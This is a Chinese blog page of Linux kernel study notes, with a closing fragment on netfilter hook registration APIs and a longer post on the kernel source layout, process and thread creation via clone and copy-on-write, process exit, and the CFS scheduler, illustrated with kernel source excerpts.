(*okfn)(struct net *, struct sock *, struct sk_buff *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>相关 API 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nf_register_net_hook</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *ops)</span></span>; <span class="comment">/* 用于注册挂钩点 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_unregister_net_hook</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *ops)</span></span>; <span class="comment">/* 用于注销挂钩点 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nf_register_net_hooks</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *reg,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span></span>; <span class="comment">/* 调用n次nf_register_net_hook */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_unregister_net_hooks</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *reg,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span></span>; <span class="comment">/* 调用n次nf_unregister_net_hook */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nf_register_net_hooks</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *reg,</span></span></span><br><span class="line"><span class="params"><span class="function">			  <span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		err = nf_register_net_hook(net, &amp;reg[i]);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">	<span class="keyword">if</span> (i &gt; <span class="number">0</span>)</span><br><span class="line">		nf_unregister_net_hooks(net, reg, i);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nf_register_net_hooks);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_unregister_net_hooks</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *reg,</span></span></span><br><span class="line"><span class="params"><span class="function">			     <span class="keyword">unsigned</span> <span class="keyword">int</span> hookcount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; hookcount; i++)</span><br><span class="line">		nf_unregister_net_hook(net, &amp;reg[i]);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nf_unregister_net_hooks);</span><br></pre></td></tr></table></figure>
<p>Linux 抓包的具体实现就是依靠该 hook 机制完成的，当网络过滤器捕获数据时，就可以依靠抓包程序的 hook 把数据包传输到对应的软件中</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Linux内核学习笔记（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-18 23:38:46" itemprop="dateCreated datePublished" datetime="2022-08-18T23:38:46+08:00">2022-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-02 16:52:18" itemprop="dateModified" datetime="2023-04-02T16:52:18+08:00">2023-04-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>87k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1:19</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Linux-内核简述"><a href="#Linux-内核简述" class="headerlink" title="Linux 内核简述"></a>Linux 内核简述</h2><p>Linux 的内核虽然是基于单内核的，但是经过这么多年的发展，也具备微内核的一些特征（体现了 Linux 实用至上的原则）</p>
<p>主要有以下特征：</p>
<ul>
<li>使用 GNU C 库（和标准C库有一定的区别）</li>
<li>支持动态加载内核模块</li>
<li>支持对称多处理（SMP）</li>
<li>内核可以抢占（preemptive），允许内核运行的任务有优先执行的能力</li>
<li>不区分线程和进程</li>
</ul>
<h2 id="Linux-内核源码的结构"><a href="#Linux-内核源码的结构" class="headerlink" title="Linux 内核源码的结构"></a>Linux 内核源码的结构</h2><div class="table-container">
<table>
<thead>
<tr>
<th><strong>目录</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>arch</td>
<td>特定体系结构的代码</td>
</tr>
<tr>
<td>block</td>
<td>块设备I/O层</td>
</tr>
<tr>
<td>crypo</td>
<td>加密API</td>
</tr>
<tr>
<td>Documentation</td>
<td>内核源码文档</td>
</tr>
<tr>
<td>drivers</td>
<td>设备驱动程序</td>
</tr>
<tr>
<td>firmware</td>
<td>使用某些驱动程序而需要的设备固件</td>
</tr>
<tr>
<td>fs</td>
<td>VFS和各种文件系统</td>
</tr>
<tr>
<td>include</td>
<td>内核头文件</td>
</tr>
<tr>
<td>init</td>
<td>内核引导和初始化</td>
</tr>
<tr>
<td>ipc</td>
<td>进程间通信代码</td>
</tr>
<tr>
<td>kernel</td>
<td>像调度程序这样的核心子系统</td>
</tr>
<tr>
<td>lib</td>
<td>同样内核函数</td>
</tr>
<tr>
<td>mm</td>
<td>内存管理子系统和VM</td>
</tr>
<tr>
<td>net</td>
<td>网络子系统</td>
</tr>
<tr>
<td>samples</td>
<td>示例，示范代码</td>
</tr>
<tr>
<td>scripts</td>
<td>编译内核所用的脚本</td>
</tr>
<tr>
<td>security</td>
<td>Linux 安全模块</td>
</tr>
<tr>
<td>sound</td>
<td>语音子系统</td>
</tr>
<tr>
<td>usr</td>
<td>早期用户空间代码（所谓的initramfs）</td>
</tr>
<tr>
<td>tools</td>
<td>在Linux开发中有用的工具</td>
</tr>
<tr>
<td>virt</td>
<td>虚拟化基础结构</td>
</tr>
</tbody>
</table>
</div>
<h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><p>进程就是处于执行期的程序，包括：可执行代码，打开的文件，挂起的信号，内核内部的数据，处理器状态，一个或者多个具有内存映射的空间，一个或者多个执行线程，还有存放全局变量的代码段</p>
<p>内核把进程表列存放在叫做 <strong>任务队列(task_list)</strong> 的双向循环链表中，链表中的每个类型都是 <code>task_struct</code>（该结构体相对较大，包含一个具体进程的所有信息，通常存放在该进程内核栈的末尾）</p>
<ul>
<li>Windows：开启的一个程序就是一个线程，它只是一个容器，用于装载系统资源，它并不执行代码，它是系统资源分配的最小单元，而在进程中执行代码的是线程，是代码执行的最小单位</li>
<li>Linux：Linux 中的进程于 Windows 相比是很轻量级的，而且不严格区分进程和线程，Linux 的进程就是 Windows 中的线程，线程就是轻量级的进程</li>
</ul>
<p><strong>Linux 中的第一个进程</strong></p>
<p>Linux 内核在系统启动的最后阶段会启动 init 进程，该进程会读取系统的初始化脚本，并执行其他相关程序，最终启动系统</p>
<p>所有其他进程都是 PID 为“1”的 init 进程的后代</p>
<p><strong>Linux 进程的状态</strong></p>
<ul>
<li>TASK_RUNNING（运行）：正在运行，或者在运行队列中等待运行</li>
<li>TASK_INTERRUPTIBLE（可中断）：正在睡眠（被阻塞），可以接受信号而被唤醒</li>
<li>TASK_UNINTERRUPTIBLE（不可中断）：正在睡眠（被阻塞），不能被唤醒</li>
<li>TASK_TRACED（被追踪）：被其他进程跟踪（例如：通过 ptrace 对调试程序进行跟踪）<ul>
<li>强大的调试工具 <code>gdb</code> 和 Linux 系统调用和信号跟踪工具 <code>strace</code>，都是用 ptrace 实现的</li>
<li>ptrace 是一个系统调用，它提供了一种方法来让‘父’进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器，主要用来实现断点调试和系统调用跟踪  </li>
</ul>
</li>
<li>TASK_STOPPED（停止）：即将停止，然后被回收</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1662381646423-1666871176497.png" class width="1662381646423"> 
<p><strong>Linux 进程的创建</strong></p>
<p>Linux 中创建进程与其他系统有个主要区别，Linux 中创建进程分2步：fork() 和 exec() </p>
<ul>
<li>fork：通过拷贝当前进程创建一个子进程</li>
<li>exec：读取可执行文件，将其载入到内存中运行</li>
</ul>
<p>Copy On Write，写时复制：</p>
<ul>
<li>如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会获取指向相同资源的指针</li>
<li>直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本（private copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变 </li>
</ul>
<p>也就是说，在一份共享资源，被多个调用者共同消费时，若出现修改资源的操作，我们并不直接对资源进行修改，而是对将资源修改操作划分为三个步骤：</p>
<ul>
<li>第一：先将资源以 [页为单位] 进行复制，复制出一个新的资源备份</li>
<li>第二：往这个资源备份里面添加新的数据</li>
<li>第三：将原先资源地址指向资源备份的地址</li>
</ul>
<p>Copy On Write 对 fork 的优化：</p>
<ul>
<li>减少分配和复制大量资源时带来的瞬间延时</li>
<li>fork 并不是所有的页面都需要复制，父进程的代码段和只读数据段都不被允许修改，所以无需复制</li>
</ul>
<p>Copy On Write 的原理：</p>
<ul>
<li>fork() 之后，kernel 把父进程中所有的内存页的权限都设为 read-only，然后子进程的地址空间指向父进程</li>
<li>当父子进程都只读内存时，相安无事，当其中某个进程写内存时，CPU硬件检测到内存页是 read-only 的，于是触发页异常中断（page-fault），陷入 kernel 的一个中断例程</li>
<li>中断例程中，kernel 就会把触发的异常的页复制一份，于是父子进程各自持有独立的一份</li>
</ul>
<p>创建的流程： </p>
<ul>
<li>系统调用 clone 的底层会调用 fork()，它的又底层是 _do_fork()，在其中会调用 copy_process()</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = copy_process(clone_flags, stack_start, stack_size,</span><br><span class="line">		 child_tidptr, <span class="literal">NULL</span>, trace, tls, NUMA_NO_NODE); <span class="comment">/* task_struct *p */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>调用 dup_task_struct() 为新进程分配内核栈，task_struct 等，其中的内容与父进程相同</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = dup_task_struct(current, node); <span class="comment">/* task_struct *p */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>check 新进程（进程数目是否超出上限等）</li>
<li>清理新进程的信息（比如 PID 置0等），使之与父进程区别开</li>
<li>新进程状态置为 TASK_UNINTERRUPTIBLE</li>
<li>更新 task_struct 的 flags 成员</li>
<li>执行调度程序相关设置，将此任务分配给 CPU，然后调用 copy 系列函数复制所有进程信息</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">shm_init_task(p);</span><br><span class="line">retval = security_task_alloc(p, clone_flags);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_audit;</span><br><span class="line">retval = copy_semundo(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_security;</span><br><span class="line">retval = copy_files(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_semundo;</span><br><span class="line">retval = copy_fs(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_files;</span><br><span class="line">retval = copy_sighand(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_fs;</span><br><span class="line">retval = copy_signal(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_sighand;</span><br><span class="line">retval = copy_mm(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_signal;</span><br><span class="line">retval = copy_namespaces(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_mm;</span><br><span class="line">retval = copy_io(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_namespaces;</span><br><span class="line">retval = copy_thread_tls(clone_flags, stack_start, stack_size, p, tls);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_io;</span><br></pre></td></tr></table></figure>
<ul>
<li>调用 alloc_pid() 为新进程分配一个有效的PID（copy_process() 返回）</li>
<li>根据 clone() 的参数标志 clone_flags，拷贝或共享相应的信息</li>
<li>做一些扫尾工作并返回新进程指针</li>
</ul>
<p>用户态创建进程的 fork() 函数实际上最终是调用 clone() 系统调用，创建线程和进程的步骤一样，只是最终传给 clone() 的参数不同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ea1f3d</span> &lt;fork+<span class="number">77</span>&gt;    syscall  &lt;SYS_clone&gt;</span><br><span class="line">       fn: <span class="number">0x1200011</span></span><br><span class="line">       child_stack: <span class="number">0x0</span></span><br><span class="line">       flags: <span class="number">0x0</span></span><br><span class="line">       arg: <span class="number">0x7ffff7fb2810</span> ◂— <span class="number">0x0</span></span><br><span class="line">       vararg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>在内核中创建的内核线程与普通的进程之间还有个主要区别在于：</p>
<ul>
<li>内核线程没有独立的地址空间，它们只能在内核空间运行</li>
<li>这与之前提到的 Linux 内核是个单内核有关</li>
</ul>
<p>fork 的变种：vfork</p>
<ul>
<li>除了不拷贝父进程的页表项以外，vfork 和 fork 的功能相同，子进程作为父进程的一个单独线程，并在父进程的地址空间里运行</li>
<li>创建的子进程会执行完后，才到父进程执行</li>
</ul>
<p><strong>Linux 线程的创建</strong></p>
<p>在 Linux 中，线程被视为一个与其他进程共享某些资源的进程，每个线程会单独占有一个 task_struct 结构体</p>
<p>Linux 线程和进程的底层都是系统调用 clone（上文已经介绍了 clone 的实现），就是传入的参数不同：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clone(CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND , <span class="number">0</span>); <span class="comment">/* 创建线程 */</span></span><br><span class="line">clone(SIGCHLD , <span class="number">0</span>); <span class="comment">/* fork */</span></span><br><span class="line">clone(CLONE_VFORK | CLONE_VM | SIGCHLD, <span class="number">0</span>); <span class="comment">/* vfork */</span></span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>参数标志</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>CLONE_SETTID</td>
<td>将TID回写至用户空间</td>
</tr>
<tr>
<td>CLONE_SETTLS</td>
<td>为子进程创建新的TLS</td>
</tr>
<tr>
<td>CLONE_SIGHAND</td>
<td>父子进程共享信号处理函数以及被阻断的信号</td>
</tr>
<tr>
<td>CLONE_FILES</td>
<td>父子进程共享打开的文件</td>
</tr>
<tr>
<td>CLONE_FS</td>
<td>父子进程共享文件系统信息</td>
</tr>
<tr>
<td>CLONE_SYSVSEM</td>
<td>父子进程共享System V SEM_UNDO语义</td>
</tr>
<tr>
<td>CLONE_THREAD</td>
<td>父子进程放入相同的线程组</td>
</tr>
<tr>
<td>CLONE_VFORK</td>
<td>调用<code>vfork</code>，父进程准备睡眠等待子进程将其唤醒</td>
</tr>
<tr>
<td>CLONE_NEWNS</td>
<td>为子进程创建新的命名空间</td>
</tr>
<tr>
<td>CLONE_STOP</td>
<td>以TASK_STOPPED状态开始进程</td>
</tr>
<tr>
<td>CLONE_VM</td>
<td>父子进程共享地址空间</td>
</tr>
</tbody>
</table>
</div>
<p><strong>Linux 进程的终止</strong></p>
<p>进程的终止一般是显示地调用 exit，或者隐式地从某个主函数中返回，和创建进程一样，终结一个进程同样有很多步骤：</p>
<p>子进程上的操作：（do_exit）</p>
<ul>
<li>设置 task_struct 中的标识成员设置为 PF_EXITING</li>
<li>调用 del_timer_sync() 删除内核定时器, 确保没有定时器在排队和运行</li>
<li>调用 exit_mm() 释放进程占用的 mm_struct</li>
<li>调用 sem__exit() ，使进程离开等待 IPC 信号的队列</li>
<li>调用 exit_files() 和 exit_fs()，释放进程占用的文件描述符和文件系统资源</li>
<li>把 task_struct 的 exit_code 设置为进程的返回值</li>
<li>调用 exit_notify() 向父进程发送信号，并把自己的状态设为 EXIT_ZOMBIE</li>
<li>切换到新进程继续执行</li>
</ul>
<p>子进程进入 EXIT_ZOMBIE 之后，虽然永远不会被调度，关联的资源也释放掉了，但是它本身占用的内存还没有释放（比如：创建时分配的内核栈，task_struct 结构等），这些由父进程来释放</p>
<p>父进程上的操作：（release_task）</p>
<ul>
<li>父进程受到子进程发送的 exit_notify() 信号后，将该子进程的进程描述符和所有进程独享的资源全部删除</li>
</ul>
<p>从上面的步骤可以看出，必须要确保每个子进程都有父进程，如果父进程在子进程结束之前就已经结束了会怎么样呢？</p>
<ul>
<li>子进程在调用 exit_notify() 时已经考虑到了这点</li>
<li>如果子进程的父进程已经退出了，那么子进程在退出时，exit_notify() 函数会先调用 forget_original_parent() ，然后再调用 find_new_reaper() 来寻找新的父进程</li>
<li>find_new_reaper() 函数先在当前线程组中找一个线程作为父亲，如果找不到，就让 init 做父进程（init 进程是在 linux 启动时就一直存在的）</li>
</ul>
<h2 id="进程的调度"><a href="#进程的调度" class="headerlink" title="进程的调度"></a>进程的调度</h2><p>现在的操作系统都是 <strong>抢占式多任务</strong> 的，为了能让更多的任务能同时在系统上更好的运行，需要一个管理程序来管理计算机上同时运行的各个任务（也就是进程）</p>
<ul>
<li>抢占式多任务：由调度模式来决定什么时候停止一个进程的运行，以便其他进程可以得到运行机会（这个强制挂起的动作就是抢占）</li>
<li>非抢占式多任务：除非进程自己主动停止运行，否则它会一直执行（这个主动挂起的操作就是让步）</li>
</ul>
<p>这个管理程序就是调度程序，它的功能说起来很简单：</p>
<ul>
<li>决定哪些进程运行，哪些进程等待</li>
<li>决定每个进程运行多长时间</li>
</ul>
<p>总之，调度是一个平衡的过程：</p>
<ul>
<li>一方面，它要保证各个运行的进程能够最大限度的使用CPU（即尽量少的切换进程，进程切换过多，CPU的时间会浪费在切换上）</li>
<li>另一方面，保证各个进程能公平的使用CPU（即防止一个进程长时间独占CPU的情况）</li>
</ul>
<p><strong>IO消耗型进程&amp;CPU消耗型进程</strong></p>
<p>IO消耗型进程：用大部分时间来提交/等待 IO 请求，这种进程经常处于可运行状态，但通常都是运行短短的一会儿</p>
<p>CPU消耗型进程：把大部分时间用在执行代码上，除非被抢占，否则它们通常都一直在不停地运行，因为它们对 IO 的需求很小</p>
<p>进程调度策略往往要在这两个矛盾中间寻找平衡：</p>
<ul>
<li>进程响应迅速</li>
<li>最大系统利用率</li>
</ul>
<p><strong>时间片</strong></p>
<p>决定哪个进程运行以及运行多长时间都和进程的优先级有关，但是对于调度程序来说，并不是运行一次就结束了，还必须知道间隔多久进行下次调度</p>
<p>为了确定一个进程到底能持续运行多长时间，调度中还引入了时间片的概念，也可以认为是进程在下次调度发生前运行的时间（除非进程主动放弃CPU，或者有实时进程来抢占CPU）</p>
<p>时间片的大小设置并不简单：</p>
<ul>
<li>设大了，系统响应变慢（调度周期长）</li>
<li>设小了，进程频繁切换带来的处理器消耗</li>
<li>默认的时间片一般是10ms</li>
</ul>
<p>通常来说：</p>
<ul>
<li>IO消耗型进程不需要太长的时间片</li>
<li>CPU消耗型进程则希望时间片越长越好</li>
</ul>
<p><strong>完全公平调度器 CFS</strong></p>
<p>前面说过，调度功能就是决定哪个进程运行以及进程运行多长时间</p>
<p>进程的优先级有2种度量方法，一种是 nice 值，一种是实时优先级：（实时优先级 &gt; nice 值）</p>
<ul>
<li>nice 值的范围是 -20～19，值越大优先级越低，也就是说 nice 值为 -20 的进程优先级最大</li>
<li>实时优先级的范围是 0～99，与 nice 值的定义相反，实时优先级是值越大优先级越高</li>
</ul>
<p>实时进程都是一些对响应时间要求比较高的进程，因此系统中有实时优先级高的进程处于运行队列的话，它们会抢占一般的进程的运行时间</p>
<p>介绍下 CFS：</p>
<ul>
<li>CFS 使用红黑树结构，来存储要调度的任务队列</li>
<li>每个节点代表了一个要调度的任务，节点的 key 即为虚拟时间（vruntime），虚拟时间由这个人物的运行时间计算而来（CFS 不再有时间片的概念，取而代之的是 vruntime）</li>
<li>key 越小，也就是 vruntime 越小的话，红黑树对应的节点就越靠左</li>
<li>CFS scheduler 每次都挑选最左边的节点作为下一个要运行的任务，这个节点是“缓存的”，由一个特殊的指针指向，不需要进行 <code>O(logn)</code> 遍历来查找，也因此，CFS 搜索的时间是 <code>O(1)</code></li>
</ul>
<p>vruntime(key) 的计算公式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vruntime += 实际运行时间(time process run) * <span class="number">1024</span> / 进程权重(load weight of <span class="keyword">this</span> process)</span><br></pre></td></tr></table></figure>
<ul>
<li>实际运行时间：该程序已经运行了多久 </li>
<li>进程权重：根据任务的 nice 值进行索引</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> prio_to_weight[<span class="number">40</span>] = &#123;</span><br><span class="line"> <span class="comment">/* -20 */</span>     <span class="number">88761</span>,     <span class="number">71755</span>,     <span class="number">56483</span>,     <span class="number">46273</span>,     <span class="number">36291</span>,</span><br><span class="line"> <span class="comment">/* -15 */</span>     <span class="number">29154</span>,     <span class="number">23254</span>,     <span class="number">18705</span>,     <span class="number">14949</span>,     <span class="number">11916</span>,</span><br><span class="line"> <span class="comment">/* -10 */</span>      <span class="number">9548</span>,      <span class="number">7620</span>,      <span class="number">6100</span>,      <span class="number">4904</span>,      <span class="number">3906</span>,</span><br><span class="line"> <span class="comment">/*  -5 */</span>      <span class="number">3121</span>,      <span class="number">2501</span>,      <span class="number">1991</span>,      <span class="number">1586</span>,      <span class="number">1277</span>,</span><br><span class="line"> <span class="comment">/*   0 */</span>      <span class="number">1024</span>,       <span class="number">820</span>,       <span class="number">655</span>,       <span class="number">526</span>,       <span class="number">423</span>,</span><br><span class="line"> <span class="comment">/*   5 */</span>       <span class="number">335</span>,       <span class="number">272</span>,       <span class="number">215</span>,       <span class="number">172</span>,       <span class="number">137</span>,</span><br><span class="line"> <span class="comment">/*  10 */</span>       <span class="number">110</span>,        <span class="number">87</span>,        <span class="number">70</span>,        <span class="number">56</span>,        <span class="number">45</span>,</span><br><span class="line"> <span class="comment">/*  15 */</span>        <span class="number">36</span>,        <span class="number">29</span>,        <span class="number">23</span>,        <span class="number">18</span>,        <span class="number">15</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>相当于 nice 和 weight 是等价的，但是不同 nice 值的任务权重差别变大了</li>
</ul>
<p>例子：现在我们有一个刚来的进程 [time=0，nice=0，priority=1024]：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vruntime += <span class="number">0</span> * <span class="number">1024</span> / <span class="number">1024</span> = <span class="number">10</span> <span class="comment">/* vruntime有一个最小值min_vruntime */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>vruntime 并不是无限小的，有一个最小值来限定 min_vruntime </li>
<li>假如新进程的 vruntime 初值为0的话，比老进程的值小很多，那么它在相当长的时间内都会保持抢占CPU的优势，老进程就要饿死了，这显然是不公平的</li>
</ul>
<p>CFS 是这样做的：每个CPU的运行队列 cfs_rq 都维护一个 min_vruntime 字段，记录该运行队列中所有进程的 vruntime 最小值，新进程的初始 vruntime 值就以它所在运行队列的 min_vruntime 为基础来设置，与老进程保持在合理的差距范围内</p>
<p>对于新任务来说，vruntime = 0（任务：用于完成某个操作的一组 [进程,线程]，用 <code>task_struct</code> 结构体来描述）</p>
<p><strong>调度器入口</strong></p>
<p>进程调度器的主要入口是函数 schedule()：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage __visible <span class="keyword">void</span> __sched <span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span> =</span> current;</span><br><span class="line"></span><br><span class="line">	sched_submit_work(tsk);</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		preempt_disable();</span><br><span class="line">		__schedule(<span class="literal">false</span>);</span><br><span class="line">		sched_preempt_enable_no_resched();</span><br><span class="line">	&#125; <span class="keyword">while</span> (need_resched());</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(schedule);</span><br></pre></td></tr></table></figure>
<ul>
